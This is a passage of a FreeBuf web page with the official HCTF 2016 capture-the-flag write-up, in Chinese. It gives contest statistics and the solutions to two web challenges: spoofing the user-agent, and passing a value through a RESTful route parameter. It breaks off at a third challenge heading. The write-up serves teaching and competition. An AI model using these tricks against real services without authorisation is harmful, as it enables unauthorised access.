<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="*本文原创作者：sysorem，本文属FreeBuf原创奖励计划，未经许可禁止转载 
    
    
2016年11月25日20:00 &#8211; 2016年11月27日20:00，历时48小时，第八届HCTF网络安全对抗赛正式完结。本次比赛由Vidar-Team全程…" />
<meta name="keywords" content="HCTF, WEB安全渗透测试报告,WEB安全大事件点评,WEB安全技术, 其他" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='专家观点：不建议在SCADA系统中部署防火墙' href='http://www.freebuf.com/articles/security-management/121663.html' />
<link rel='next' title='俄罗斯中央银行被黑，20亿卢布为何不翼而飞？' href='http://www.freebuf.com/news/121966.html' />
<link rel='canonical' href='http://www.freebuf.com/articles/web/121778.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=121778' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    HCTF 2016网络攻防大赛官方Writeup                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/sysorem" title="由 sysorem 发布" rel="author">sysorem</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2016-12-05</span>
                                                                                                                <span class="rmb"><img title="现金奖励" src="http://image.3001.net/images/new/icon-m.jpg"/></span>
                                                                        <span class="look">共<strong>595344</strong>人围观
                                        ，发现 <strong>9</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./articles/web">WEB安全</a><a href="http://www.freebuf.com/./articles/others-articles">其他</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p><b style="color: rgb(239, 71, 71);">*本文原创作者：sysorem，本文属FreeBuf原创奖励计划，未经许可禁止转载 </b></p>
<p style="text-align: center;"><img alt="banner.png" data-original="http://image.3001.net/images/20161202/14806084705580.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="515">    </p>
<noscript><img alt="banner.png" src="http://image.3001.net/images/20161202/14806084705580.png!small" width="690" height="515">    </p></noscript>
<blockquote><p>2016年11月25日20:00 &#8211; 2016年11月27日20:00，历时48小时，第八届HCTF网络安全对抗赛正式完结。本次比赛由Vidar-Team全程提供技术支持，Vidar-Team成立于2016年9月，由一群热衷研究网络安全技术的小伙伴组成。想了解更多关于Vidar-Team介绍，欢迎访问我们的<a href="https://wiki.vidar.club/" target="_blank">wiki</a>。</p>
</blockquote>
<p>赛前我们做了各种准备，也经历了各种突发情况，总算是还算完美地给大家呈现了一场精彩的HCTF，不知道大家感觉怎么样，为了能够给大家带来一场更有趣的比赛，我们还是坚持使用了特殊的比赛规则，还用上了从Defcon学来的动态分数制度，虽然下层制度还有很多不完善，但仍希望大家能享受和传统竞赛不一样的乐趣。</p>
<p>稍稍总结一下整场比赛吧，报名队伍超过1800+，当然，由于xctftime的一些问题，很多队伍都是无效的，<b>成功登陆过的队伍有412支</b>，<b>完成杂项签到的队伍数为235</b>，<b>完成web签到题目的队伍数为226</b>，<b>结束时还在第一层的队伍有184</b>，<b>在第二层的有168</b>，<b>在第三层的有30</b>，<b>在第四层的有15支</b>，<b>能进入第五层的只有15支</b>。<b>唯二没有人解出来的题目是Crypto So Amazing和5-days</b>，<b>队伍AAA在开赛7小时第一个进入了第四层</b>，<b>队伍FlappyPig在开赛24小时第一个进入了第五层！</b>    </p>
<p>下面附上出题人的writeup(由于re已经公开了源码，下面的wp就不包括re部分了)</p>
<p><a href="https://github.com/hduisa/HCTF2016">题目源码</a></p>
<p>本次题目共分为5层 ，下面逐层奉上各位师傅的解题姿势。</p>
<p style="text-align: center;"><img alt="levels.jpg" data-original="http://image.3001.net/images/20161202/14806087302545.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="364">&nbsp;</p>
<noscript><img alt="levels.jpg" src="http://image.3001.net/images/20161202/14806087302545.jpg!small" width="690" height="364">&nbsp;</p></noscript>
<h2><b># Level1 #</b></h2>
<h3>## 2099年的flag ##</h3>
<blockquote><p>题目描述：only ios99 can get flag(Maybe you can easily get the flag in 2099</p>
<p>最终分数：10pt</p>
<p>完成人数：226</p>
</blockquote>
<p>进去后发现这么一句话，相信有经验的人第一时间就能反应过来是要改ua。</p>
<p>这次比赛中总有感觉可能很多人不知道，Chrome的开发者工具(F12一下)里本身就能模拟手机访问，复制请求头中的ua，然后修改为ios99即可（ps：ios是iphone的系统）</p>
<h2></h2>
<h2></h2>
<h2></h2>
<h2># Level 2 #</h2>
<h3>## RESTFUL ##</h3>
<blockquote><p>题目描述：博丽神社赛钱箱</p>
<p>最终分数：34pt</p>
<p>完成人数：152</p>
</blockquote>
<p>其实题目是很简单的，熟悉Web开发的老司机应该都知道RESTFUL Webservice。</p>
<p>在RESTFUL下，传参方式改成了路由传参，也就是`\money\12345`就是传递了money=12345。</p>
<p>所以根据题意，锁定payload，贴心的Aklis大佬还自带了脚本</p>
<p style="text-align: center;"><img alt="10.png" data-original="http://image.3001.net/images/20161202/14806102674013.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="662" height="388">     </p>
<noscript><img alt="10.png" src="http://image.3001.net/images/20161202/14806102674013.png!small" width="662" height="388">     </p></noscript>
<h3></h3>
<h3></h3>
<h3>## pic again ##<br /></h3>
